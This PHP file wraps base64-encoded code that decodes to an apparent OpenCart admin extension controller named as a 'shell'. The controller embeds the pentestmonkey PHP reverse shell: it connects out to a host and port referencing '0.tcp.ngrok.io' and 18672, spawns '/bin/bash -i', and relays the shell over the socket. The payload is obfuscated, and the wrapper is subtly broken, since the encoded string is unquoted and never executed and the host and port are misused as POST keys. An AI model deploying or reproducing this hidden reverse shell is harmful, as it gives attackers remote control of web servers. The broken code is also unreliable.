<?php
base64_decode(CgpjbGFzcyBDb250cm9sbGVyRXh0ZW5zaW9uRXh0ZW5zaW9uU2hlbGwgZXh0ZW5kcyBDb250cm9sbGVyIHsKCXZhciAkZXJyb3IgPSBbXTsKCglwdWJsaWMgZnVuY3Rpb24gaW5kZXgoKSB7CgkgICAgZm9yZWFjaCAoJHRoaXMtPnJlcXVlc3QtPnBvc3QgYXMgJGtleSA9PiAmJHZhbHVlKSB7CgkgICAgICAgICR2YWx1ZSA9IGh0bWxfZW50aXR5X2RlY29kZSgkdmFsdWUpOwogICAgICAgIH0KCgkJJHRoaXMtPmxvYWQtPmxhbmd1YWdlKCdleHRlbnNpb24vZXh0ZW5zaW9uL3NoZWxsJyk7CgkJJHRoaXMtPmRvY3VtZW50LT5zZXRUaXRsZSgkdGhpcy0+bGFuZ3VhZ2UtPmdldCgnaGVhZGluZ190aXRsZScpKTsKCgkJJGRhdGFbJ2hlYWRlciddID0gJHRoaXMtPmxvYWQtPmNvbnRyb2xsZXIoJ2NvbW1vbi9oZWFkZXInKTsKCQkkZGF0YVsnY29sdW1uX2xlZnQnXSA9ICR0aGlzLT5sb2FkLT5jb250cm9sbGVyKCdjb21tb24vY29sdW1uX2xlZnQnKTsKCQkkZGF0YVsnZm9vdGVyJ10gPSAkdGhpcy0+bG9hZC0+Y29udHJvbGxlcignY29tbW9uL2Zvb3RlcicpOwoKCQkkZGF0YVsnYnJlYWRjcnVtYnMnXSA9IGFycmF5KCk7CgoJCSRkYXRhWydicmVhZGNydW1icyddW10gPSBhcnJheSgKCQkJJ3RleHQnID0+ICR0aGlzLT5sYW5ndWFnZS0+Z2V0KCd0ZXh0X2hvbWUnKSwKCQkJJ2hyZWYnID0+ICR0aGlzLT51cmwtPmxpbmsoJ2NvbW1vbi9kYXNoYm9hcmQnLCAndXNlcl90b2tlbj0nIC4gJHRoaXMtPnNlc3Npb24tPmRhdGFbJ3VzZXJfdG9rZW4nXSwgdHJ1ZSkKCQkpOwoKCQkkZGF0YVsnYnJlYWRjcnVtYnMnXVtdID0gYXJyYXkoCgkJCSd0ZXh0JyA9PiAkdGhpcy0+bGFuZ3VhZ2UtPmdldCgnaGVhZGluZ190aXRsZScpLAoJCQknaHJlZicgPT4gJHRoaXMtPnVybC0+bGluaygnZXh0ZW5zaW9uL2V4dGVuc2lvbi9zaGVsbCcsICd1c2VyX3Rva2VuPScgLiAkdGhpcy0+c2Vzc2lvbi0+ZGF0YVsndXNlcl90b2tlbiddLCB0cnVlKQoJCSk7CgoJCWlmICgoJHRoaXMtPnJlcXVlc3QtPnNlcnZlclsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnKSAmJiAkdGhpcy0+dmFsaWRhdGVGb3JtKCkpIHsKCQkJaWYgKCR0aGlzLT5vcGVuU2hlbGwoKSkgewogICAgICAgICAgICAgICAgJGRhdGFbJ3N1Y2Nlc3MnXSA9ICdSZXZlcnNlIHNoZWxsIG9wZW5lZCEnOwogICAgICAgICAgICB9CgkJfQoKCQkkZGF0YSA9ICRkYXRhICsgJHRoaXMtPmVycm9yOwoJCWZvcmVhY2ggKFsnaG9zdCcsICdwb3J0JywgJ2NvbW1hbmQnXSBhcyAkcGFyYW0pIHsKCQkJaWYgKGlzc2V0KCR0aGlzLT5yZXF1ZXN0LT5wb3N0WyRwYXJhbV0pKSB7CgkJCQkkZGF0YVskcGFyYW1dID0gJHRoaXMtPnJlcXVlc3QtPnBvc3RbJHBhcmFtXTsKCQkJfQoJCX0KCgkJaWYgKGVtcHR5KCRkYXRhWydjb21tYW5kJ10pKSB7CgkJCSRkYXRhWydjb21tYW5kJ10gPSAnL2Jpbi9iYXNoIC1pJzsKCQl9CgoJCSR0aGlzLT5yZXNwb25zZS0+c2V0T3V0cHV0KCR0aGlzLT5sb2FkLT52aWV3KCdleHRlbnNpb24vZXh0ZW5zaW9uL3NoZWxsJywgJGRhdGEpKTsKCX0KCglwcm90ZWN0ZWQgZnVuY3Rpb24gdmFsaWRhdGVGb3JtKCkgewoJCSR0aGlzLT5lcnJvciA9IFtdOwogICAgICAgIGlmIChlbXB0eSgkdGhpcy0+cmVxdWVzdC0+cG9zdFsnaG9zdCddKSkgewogICAgICAgICAgICAkdGhpcy0+ZXJyb3JbJ2Vycm9yX2hvc3QnXSA9ICR0aGlzLT5sYW5ndWFnZS0+Z2V0KCd0ZXh0X2Vycm9yX2hvc3QnKTsKICAgICAgICB9CgkJJHBvcnQgPSAkdGhpcy0+cmVxdWVzdC0+cG9zdFsncG9ydCddOwoJCWlmICghZmlsdGVyX3ZhcigkcG9ydCwgRklMVEVSX1ZBTElEQVRFX0lOVCkgfHwgISgkcG9ydCA+PSAwICYmICRwb3J0IDwgNjU1MzYpKSB7CgkJCSR0aGlzLT5lcnJvclsnZXJyb3JfcG9ydCddID0gJHRoaXMtPmxhbmd1YWdlLT5nZXQoJ3RleHRfZXJyb3JfcG9ydCcpOwoJCX0KCQlyZXR1cm4gISR0aGlzLT5lcnJvcjsKCX0KCglwcml2YXRlIGZ1bmN0aW9uIG9wZW5TaGVsbCgpIHsKCQkvLyBwaHAtcmV2ZXJzZS1zaGVsbCAtIEEgUmV2ZXJzZSBTaGVsbCBpbXBsZW1lbnRhdGlvbiBpbiBQSFAKCQkvLyBDb3B5cmlnaHQgKEMpIDIwMDcgcGVudGVzdG1vbmtleUBwZW50ZXN0bW9ua2V5Lm5ldAoJCS8vCgkJLy8gVGhpcyB0b29sIG1heSBiZSB1c2VkIGZvciBsZWdhbCBwdXJwb3NlcyBvbmx5LiAgVXNlcnMgdGFrZSBmdWxsIHJlc3BvbnNpYmlsaXR5CgkJLy8gZm9yIGFueSBhY3Rpb25zIHBlcmZvcm1lZCB1c2luZyB0aGlzIHRvb2wuICBUaGUgYXV0aG9yIGFjY2VwdHMgbm8gbGlhYmlsaXR5CgkJLy8gZm9yIGRhbWFnZSBjYXVzZWQgYnkgdGhpcyB0b29sLiAgSWYgdGhlc2UgdGVybXMgYXJlIG5vdCBhY2NlcHRhYmxlIHRvIHlvdSwgdGhlbgoJCS8vIGRvIG5vdCB1c2UgdGhpcyB0b29sLgoJCS8vCgkJLy8gSW4gYWxsIG90aGVyIHJlc3BlY3RzIHRoZSBHUEwgdmVyc2lvbiAyIGFwcGxpZXM6CgkJLy8KCQkvLyBUaGlzIHByb2dyYW0gaXMgZnJlZSBzb2Z0d2FyZTsgeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yIG1vZGlmeQoJCS8vIGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgdmVyc2lvbiAyIGFzCgkJLy8gcHVibGlzaGVkIGJ5IHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24uCgkJLy8KCQkvLyBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwKCQkvLyBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgoJCS8vIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUKCQkvLyBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLgoJCS8vCgkJLy8gWW91IHNob3VsZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgYWxvbmcKCQkvLyB3aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBJbmMuLAoJCS8vIDUxIEZyYW5rbGluIFN0cmVldCwgRmlmdGggRmxvb3IsIEJvc3RvbiwgTUEgMDIxMTAtMTMwMSBVU0EuCgkJLy8KCQkvLyBUaGlzIHRvb2wgbWF5IGJlIHVzZWQgZm9yIGxlZ2FsIHB1cnBvc2VzIG9ubHkuICBVc2VycyB0YWtlIGZ1bGwgcmVzcG9uc2liaWxpdHkKCQkvLyBmb3IgYW55IGFjdGlvbnMgcGVyZm9ybWVkIHVzaW5nIHRoaXMgdG9vbC4gIElmIHRoZXNlIHRlcm1zIGFyZSBub3QgYWNjZXB0YWJsZSB0bwoJCS8vIHlvdSwgdGhlbiBkbyBub3QgdXNlIHRoaXMgdG9vbC4KCQkvLwoJCS8vIFlvdSBhcmUgZW5jb3VyYWdlZCB0byBzZW5kIGNvbW1lbnRzLCBpbXByb3ZlbWVudHMgb3Igc3VnZ2VzdGlvbnMgdG8KCQkvLyBtZSBhdCBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25rZXkubmV0CgkJLy8KCQkvLyBEZXNjcmlwdGlvbgoJCS8vIC0tLS0tLS0tLS0tCgkJLy8gVGhpcyBzY3JpcHQgd2lsbCBtYWtlIGFuIG91dGJvdW5kIFRDUCBjb25uZWN0aW9uIHRvIGEgaGFyZGNvZGVkIElQIGFuZCBwb3J0LgoJCS8vIFRoZSByZWNpcGllbnQgd2lsbCBiZSBnaXZlbiBhIHNoZWxsIHJ1bm5pbmcgYXMgdGhlIGN1cnJlbnQgdXNlciAoYXBhY2hlIG5vcm1hbGx5KS4KCQkvLwoJCS8vIExpbWl0YXRpb25zCgkJLy8gLS0tLS0tLS0tLS0KCQkvLyBwcm9jX29wZW4gYW5kIHN0cmVhbV9zZXRfYmxvY2tpbmcgcmVxdWlyZSBQSFAgdmVyc2lvbiA0LjMrLCBvciA1KwoJCS8vIFVzZSBvZiBzdHJlYW1fc2VsZWN0KCkgb24gZmlsZSBkZXNjcmlwdG9ycyByZXR1cm5lZCBieSBwcm9jX29wZW4oKSB3aWxsIGZhaWwgYW5kIHJldHVybiBGQUxTRSB1bmRlciBXaW5kb3dzLgoJCS8vIFNvbWUgY29tcGlsZS10aW1lIG9wdGlvbnMgYXJlIG5lZWRlZCBmb3IgZGFlbW9uaXNhdGlvbiAobGlrZSBwY250bCwgcG9zaXgpLiAgVGhlc2UgYXJlIHJhcmVseSBhdmFpbGFibGUuCgkJLy8KCQkvLyBVc2FnZQoJCS8vIC0tLS0tCgkJLy8gU2VlIGh0dHA6Ly9wZW50ZXN0bW9ua2V5Lm5ldC90b29scy9waHAtcmV2ZXJzZS1zaGVsbCBpZiB5b3UgZ2V0IHN0dWNrLgoKCQlzZXRfdGltZV9saW1pdCgwKTsKCQkkaXAgPSAkdGhpcy0+cmVxdWVzdC0+cG9zdFsnMC50Y3Aubmdyb2suaW8nXTsgIC8vIENIQU5HRSBUSElTCgkJJHBvcnQgPSAkdGhpcy0+cmVxdWVzdC0+cG9zdFsnMTg2NzInXTsgICAgICAgLy8gQ0hBTkdFIFRISVMKCQkkY2h1bmtfc2l6ZSA9IDE0MDA7CgkJJHdyaXRlX2EgPSBOVUxMOwoJCSRlcnJvcl9hID0gTlVMTDsKCQkkc2hlbGwgPSBpc3NldCgkdGhpcy0+cmVxdWVzdC0+cG9zdFsnY29tbWFuZCddKSA/ICR0aGlzLT5yZXF1ZXN0LT5wb3N0Wydjb21tYW5kJ10gOiAnL2Jpbi9iYXNoIC1pJzsKCQkkZGFlbW9uID0gMDsKCQkkZGVidWcgPSAwOwoKCQkvLyBMaWtlIHByaW50LCBidXQgZG9lcyBub3RoaW5nIGlmIHdlJ3ZlIGRhZW1vbmlzZWQgb3Vyc2VsZgoJCS8vIChJIGNhbid0IGZpZ3VyZSBvdXQgaG93IHRvIHJlZGlyZWN0IFNURE9VVCBsaWtlIGEgcHJvcGVyIGRhZW1vbikKCQkkcHJpbnRpdCA9IGZ1bmN0aW9uICgkc3RyaW5nKSB1c2UgKCYkZGFlbW9uKSB7CgkJCWlmICghJGRhZW1vbikgewoJCQkJLy9wcmludCAiJHN0cmluZ1xuIjsKCQkJfQoJCX07CgoJCS8vIENoYW5nZSB0byBhIHNhZmUgZGlyZWN0b3J5CgkJLy9jaGRpcigiLyIpOwoKCQkvLyBSZW1vdmUgYW55IHVtYXNrIHdlIGluaGVyaXRlZAoJCXVtYXNrKDApOwoKCQkvLwoJCS8vIERvIHRoZSByZXZlcnNlIHNoZWxsLi4uCgkJLy8KCgkJLy8gT3BlbiByZXZlcnNlIGNvbm5lY3Rpb24KCQkkc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsKCQlpZiAoISRzb2NrKSB7CgkJCSR0aGlzLT5lcnJvclsnd2FybmluZyddID0gIiRlcnJzdHIgKCRlcnJubykiOwoJCQlyZXR1cm4gRkFMU0U7CgkJfQoKCQkvLyBTcGF3biBzaGVsbCBwcm9jZXNzCgkJJGRlc2NyaXB0b3JzcGVjID0gYXJyYXkoCgkJCTAgPT4gYXJyYXkoInBpcGUiLCAiciIpLCAgLy8gc3RkaW4gaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgcmVhZCBmcm9tCgkJCTEgPT4gYXJyYXkoInBpcGUiLCAidyIpLCAgLy8gc3Rkb3V0IGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvCgkJCTIgPT4gYXJyYXkoInBpcGUiLCAidyIpICAgLy8gc3RkZXJyIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvCgkJKTsKCgkJJHByb2Nlc3MgPSBwcm9jX29wZW4oJHNoZWxsLCAkZGVzY3JpcHRvcnNwZWMsICRwaXBlcyk7CgoJCWlmICghaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CgkJCSR0aGlzLT5lcnJvclsnd2FybmluZyddID0gIkVSUk9SOiBDYW4ndCBzcGF3biBzaGVsbCI7CgkJCXJldHVybiBGQUxTRTsKCQl9CgoJCS8vIFNldCBldmVyeXRoaW5nIHRvIG5vbi1ibG9ja2luZwoJCS8vIFJlYXNvbjogT2Njc2lvbmFsbHkgcmVhZHMgd2lsbCBibG9jaywgZXZlbiB0aG91Z2ggc3RyZWFtX3NlbGVjdCB0ZWxscyB1cyB0aGV5IHdvbid0CgkJc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMF0sIDApOwoJCXN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzFdLCAwKTsKCQlzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwgMCk7CgkJc3RyZWFtX3NldF9ibG9ja2luZygkc29jaywgMCk7CgoJCSRwcmludGl0KCJTdWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7CgoJCXdoaWxlICgxKSB7CgkJCS8vIENoZWNrIGZvciBlbmQgb2YgVENQIGNvbm5lY3Rpb24KCQkJaWYgKGZlb2YoJHNvY2spKSB7CgkJCQkkcHJpbnRpdCgiRVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZCIpOwoJCQkJYnJlYWs7CgkJCX0KCgkJCS8vIENoZWNrIGZvciBlbmQgb2YgU1RET1VUCgkJCWlmIChmZW9mKCRwaXBlc1sxXSkpIHsKCQkJCSRwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVkIik7CgkJCQlicmVhazsKCQkJfQoKCQkJLy8gV2FpdCB1bnRpbCBhIGNvbW1hbmQgaXMgZW5kIGRvd24gJHNvY2ssIG9yIHNvbWUKCQkJLy8gY29tbWFuZCBvdXRwdXQgaXMgYXZhaWxhYmxlIG9uIFNURE9VVCBvciBTVERFUlIKCQkJJHJlYWRfYSA9IGFycmF5KCRzb2NrLCAkcGlwZXNbMV0sICRwaXBlc1syXSk7CgkJCSRudW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVycm9yX2EsIE5VTEwpOwoKCQkJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgVENQIHNvY2tldCwgc2VuZAoJCQkvLyBkYXRhIHRvIHByb2Nlc3MncyBTVERJTgoJCQlpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFkX2EpKSB7CgkJCQlpZiAoJGRlYnVnKSB7CgkJCQkJJHByaW50aXQoIlNPQ0sgUkVBRCIpOwoJCQkJfQoJCQkJJGlucHV0ID0gZnJlYWQoJHNvY2ssICRjaHVua19zaXplKTsKCQkJCWlmICgkZGVidWcpIHsKCQkJCQkkcHJpbnRpdCgiU09DSzogJGlucHV0Iik7CgkJCQl9CgkJCQlmd3JpdGUoJHBpcGVzWzBdLCAkaW5wdXQpOwoJCQl9CgoJCQkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBwcm9jZXNzJ3MgU1RET1VUCgkJCS8vIHNlbmQgZGF0YSBkb3duIHRjcCBjb25uZWN0aW9uCgkJCWlmIChpbl9hcnJheSgkcGlwZXNbMV0sICRyZWFkX2EpKSB7CgkJCQlpZiAoJGRlYnVnKSB7CgkJCQkJJHByaW50aXQoIlNURE9VVCBSRUFEIik7CgkJCQl9CgkJCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKCQkJCWlmICgkZGVidWcpIHsKCQkJCQkkcHJpbnRpdCgiU1RET1VUOiAkaW5wdXQiKTsKCQkJCX0KCQkJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCQkJfQoKCQkJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgcHJvY2VzcydzIFNUREVSUgoJCQkvLyBzZW5kIGRhdGEgZG93biB0Y3AgY29ubmVjdGlvbgoJCQlpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkgewoJCQkJaWYgKCRkZWJ1ZykgewoJCQkJCSRwcmludGl0KCJTVERFUlIgUkVBRCIpOwoJCQkJfQoJCQkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzJdLCAkY2h1bmtfc2l6ZSk7CgkJCQlpZiAoJGRlYnVnKSB7CgkJCQkJJHByaW50aXQoIlNUREVSUjogJGlucHV0Iik7CgkJCQl9CgkJCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7CgkJCX0KCQl9CgoJCWZjbG9zZSgkc29jayk7CgkJZmNsb3NlKCRwaXBlc1swXSk7CgkJZmNsb3NlKCRwaXBlc1sxXSk7CgkJZmNsb3NlKCRwaXBlc1syXSk7CgkJcHJvY19jbG9zZSgkcHJvY2Vzcyk7CiAgICAgICAgcmV0dXJuIFRSVUU7Cgl9Cn0=)
?>